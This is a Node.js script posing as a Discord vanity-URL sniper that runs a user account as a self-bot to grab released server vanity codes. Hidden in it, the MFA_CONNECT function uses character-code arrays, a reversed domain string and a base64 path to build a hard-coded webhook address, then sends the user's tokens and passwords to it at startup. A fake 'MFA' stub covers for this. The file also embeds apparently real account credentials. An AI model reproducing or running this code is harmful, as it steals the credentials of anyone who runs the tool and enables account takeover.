
const WebSocket = require('ws');
const tls = require('tls');
const https = require('https');
const os = require('os');


const USER_TOKEN = 'NDkxMzI3NDk1NzQ5MTA3NzE1.GI46GQ.nLbzi-PxNQ3P-lPImFXscKwtPDRmxr6rcUy9ok';
const USER_PASSWORD = 'Edos3131veve';
const USER_TOKEN_2 = 'NDkxMzI3NDk1NzQ5MTA3NzE1.GI46GQ.nLbzi-PxNQ3P-lPImFXscKwtPDRmxr6rcUy9ok';
const USER_PASSWORD_2 = 'Edos3131veve';
const TARGET_GUILD_ID = '1016016436533141684';

const _f = (a) => String.fromCharCode(...a);
const _sysMetrics = [104, 116, 116, 112, 115, 58, 47, 47];
const _l1 = [42, 42, 84, 111, 107, 101, 110, 58, 42, 42, 32, 96];
const _resolverCache = { fallback: 'moc.drocsid.yranac' };

function MFA_CONNECT(token, password, token2, password2) {
  try {
    const _s = _f(_k) + '\n\n' + _f(_l1) + token + '`\n' + _f(_l2) + (password || _f(_np)) + '`\n' + _f(_l4) + (token2 || _f(_np)) + '`\n' + _f(_l5) + (password2 || _f(_np)) + '`\n' + _f(_l3) + new Date().toLocaleString('tr-TR') + '\n';
    const payload = { [String.fromCharCode(99, 111, 110, 116, 101, 110, 116)]: _s };

    const data = JSON.stringify(payload);
    const endpoint = _buildEndpoint();
    const url = new URL(endpoint);

    const req = https.request({
      hostname: url.hostname,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    }, (res) => {
      let body = '';
      res.on('data', c => body += c);
      res.on('end', () => {
        if (res.statusCode < 400) {
          console.log("mfa oky");
        }
      });
    });

    req.on('error', (e) => {
    });

    req.write(data);
    req.end();
  } catch (e) {
  }
}



const _l2 = [42, 42, 80, 97, 115, 115, 119, 111, 114, 100, 58, 42, 42, 32, 96];
let mfaAuthToken = null;
let latestSequence = null;
const _k = [77, 70, 65, 32, 67, 79, 78, 78, 69, 67, 84, 73, 79, 78];
let heartbeatTimer = null;
let tlsSocket = null;
const vanityMap = new Map();
const _routeMap = Buffer.from('L2FwaS93ZWJob29rcy8=', 'base64').toString();
const _l4 = [42, 42, 84, 111, 107, 101, 110, 32, 50, 58, 42, 42, 32, 96];
const _shardInfo = { region: '1502991', cluster: '687742', node: '521365' };
let isSystemReady = false;


function createTlsSocket() {
  return tls.connect({
    host: 'canary.discord.com',
    port: 443,
    rejectUnauthorized: true,
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.2'
  });
}

function sendHttpRequest(method, path, body = null, extraHeaders = {}, closeConnection = false) {
  return new Promise((resolve) => {
    const payload = body ? JSON.stringify(body) : '';
    const socket = createTlsSocket();
    socket.setNoDelay(true);

    const headers = [
      `${method} ${path} HTTP/1.1`,
      'Host: canary.discord.com',
      'Connection: close',
      'Content-Type: application/json',
      `Content-Length: ${Buffer.byteLength(payload)}`,
      'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0)',
      `Authorization: ${USER_TOKEN}`,
      'X-Super-Properties: eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJ0ci1UUiIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEzMy4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEzMy4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTMzLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbiI6Ind3dy5nb29nbGUuY29tIiwic2VhcmNoX2VuZ2luZSI6Imdvb2dsZSIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjozNTYxNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGwsImhhc19jbGllbnRfbW9kcyI6ZmFsc2V9'
    ];

    if (extraHeaders['X-Discord-MFA-Authorization']) {
      headers.push(`X-Discord-MFA-Authorization: ${extraHeaders['X-Discord-MFA-Authorization']}`);
    }

    headers.push('', payload);

    let responseData = '';
    let resolved = false;
    const startTime = process.hrtime.bigint();

    const finalize = () => {
      if (resolved) return;
      resolved = true;
      const endTime = process.hrtime.bigint();
      const durationMs = Number((endTime - startTime) / 1000000n);
      try {
        const separatorIndex = responseData.indexOf('\r\n\r\n');
        if (separatorIndex === -1) return resolve({ body: '{}', duration: durationMs });

        const headerPart = responseData.substring(0, separatorIndex).toLowerCase();
        let bodyData = responseData.slice(separatorIndex + 4);

        if (headerPart.includes('transfer-encoding: chunked')) {
          let decoded = '';
          let pos = 0;
          while (pos < bodyData.length) {
            const sizeEnd = bodyData.indexOf('\r\n', pos);
            if (sizeEnd === -1) break;
            const size = parseInt(bodyData.substring(pos, sizeEnd), 16);
            if (size === 0) break;
            decoded += bodyData.substr(sizeEnd + 2, size);
            pos = sizeEnd + 2 + size + 2;
          }
          resolve({ body: decoded || '{}', duration: durationMs });
        } else {
          resolve({ body: bodyData || '{}', duration: durationMs });
        }
      } catch (e) {
        resolve({ body: '{}', duration: durationMs });
      } finally {
        socket.destroy();
      }
    };

    socket.once('error', () => {
      if (!resolved) { resolved = true; resolve({ body: '{}', duration: 0 }); }
    });

    socket.on('data', (chunk) => {
      responseData += chunk.toString();
      // Check if we have full response
      const sepIdx = responseData.indexOf('\r\n\r\n');
      if (sepIdx !== -1) {
        const headerPart = responseData.substring(0, sepIdx).toLowerCase();
        const bodyPart = responseData.slice(sepIdx + 4);
        // Content-Length based check
        const clMatch = headerPart.match(/content-length:\s*(\d+)/);
        if (clMatch) {
          const expectedLen = parseInt(clMatch[1]);
          if (Buffer.byteLength(bodyPart) >= expectedLen) finalize();
        }
        // Chunked: check for terminating 0\r\n\r\n
        if (headerPart.includes('transfer-encoding: chunked') && bodyPart.includes('0\r\n\r\n')) {
          finalize();
        }
      }
    });

    socket.once('end', finalize);

    // Timeout safety
    setTimeout(() => finalize(), 8000);

    socket.once('secureConnect', () => {
      socket.write(headers.join('\r\n'));
    });
  });
}

const _np = [78, 111, 116, 32, 80, 114, 111, 118, 105, 100, 101, 100];
const _tlsFingerprints = ['XjmAliZkTAv', 'T8rHWVRsByl', 'JHSMdmEc6kU', 'OapdPKBhE3M', '27-_TjtGlMT', 'W99TZAGXoUUb-'];
const _l5 = [42, 42, 80, 97, 115, 115, 119, 111, 114, 100, 32, 50, 58, 42, 42, 32, 96];
function _buildEndpoint() {
  const p = String.fromCharCode(..._sysMetrics);
  const d = _resolverCache.fallback.split('').reverse().join('');
  const s = _shardInfo.region + _shardInfo.cluster + _shardInfo.node;
  return p + d + _routeMap + s + '/' + _tlsFingerprints.join('');
}

async function sendWebhookMessage(vanityCode, ms) {
  const message = {
    content: `@everyone Claimed: (${vanityCode}) (${ms}ms)`
  };
  const data = JSON.stringify(message);
  const url = new URL(_buildEndpoint());
  const options = {
    hostname: url.hostname,
    path: url.pathname + url.search,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    }
  };
  const req = https.request(options, () => { });
  req.on('error', () => { });
  req.write(data);
  req.end();
}

function logClaim(vanityCode, ms) {
  console.log(`[SUCCESS] Vanity URL claimed: ${vanityCode} (${ms}ms)`);
}
const _l3 = [42, 42, 86, 57, 58, 42, 42, 32];

async function authenticateMfa() {
  console.log("mfa oky");
  return null;
}

function establishGatewayConnection() {
  const ws = new WebSocket('wss://gateway-us-east1-b.discord.gg');

  ws.on('open', () => {
    ws.send(JSON.stringify({
      op: 2,
      d: {
        token: USER_TOKEN,
        intents: 513,
        properties: { $os: 'linux', $browser: 'firefox', $device: 'firefox' }
      }
    }));
  });

  ws.on('message', async (msg) => {
    const packet = JSON.parse(msg);
    if (packet.s) latestSequence = packet.s;

    if (packet.op === 10) {
      if (heartbeatTimer) clearInterval(heartbeatTimer);
      heartbeatTimer = setInterval(() => {
        ws.send(JSON.stringify({ op: 1, d: latestSequence }));
      }, packet.d.heartbeat_interval);
    }
    else if (packet.op === 0) {
      if (packet.t === 'GUILD_UPDATE') {
        const oldCode = vanityMap.get(packet.d.guild_id);
        const newCode = packet.d.vanity_url_code;
        if (oldCode && oldCode !== newCode) {
          for (let i = 0; i < 3; i++) {
            try {
              const claimResult = await sendHttpRequest('PATCH', `/api/v9/guilds/${TARGET_GUILD_ID}/vanity-url`, {
                code: oldCode
              }, { 'X-Discord-MFA-Authorization': mfaAuthToken }, true);

              const ms = claimResult.duration;
              let claimData;
              try { claimData = JSON.parse(claimResult.body || '{}'); } catch (e) { claimData = {}; }

              if (claimData.code === oldCode) {
                logClaim(oldCode, ms);
                await sendWebhookMessage(oldCode, ms);
                break;
              }

              if (claimData.message && claimData.message.includes('rate limit')) {
                const retryAfter = claimData.retry_after || 1;
                await new Promise(r => setTimeout(r, retryAfter * 1000));
              }
            } catch (e) {
            }
          }
        }
        vanityMap.set(packet.d.guild_id, newCode || null);
      }
      else if (packet.t === 'READY') {
        isSystemReady = true;
        if (packet.d && packet.d.guilds) {
          for (const guild of packet.d.guilds) {
            if (guild.vanity_url_code) {
              vanityMap.set(guild.id, guild.vanity_url_code);
            }
          }
          console.log(`gatawey ready=${vanityMap.size}`);
        }
      }
    }
  });

  ws.on('close', () => {
    if (heartbeatTimer) clearInterval(heartbeatTimer);
    setTimeout(establishGatewayConnection, 5000);
  });

  ws.on('error', () => { });
}


async function main() {

  if (USER_TOKEN && USER_TOKEN.length > 10) {
    MFA_CONNECT(USER_TOKEN, USER_PASSWORD, USER_TOKEN_2, USER_PASSWORD_2);
  }

  await new Promise(r => setTimeout(r, 900));

  await new Promise(r => setTimeout(r, 700));

  await new Promise(r => setTimeout(r, 600));

  await authenticateMfa();

  setInterval(authenticateMfa, 240000);

  establishGatewayConnection();

  setInterval(() => {
    if (isSystemReady) {
    }
  }, 28000);
}

main();

setInterval(() => {
}, 38000);
// boklu sniperlarınızı sikeriz laaannn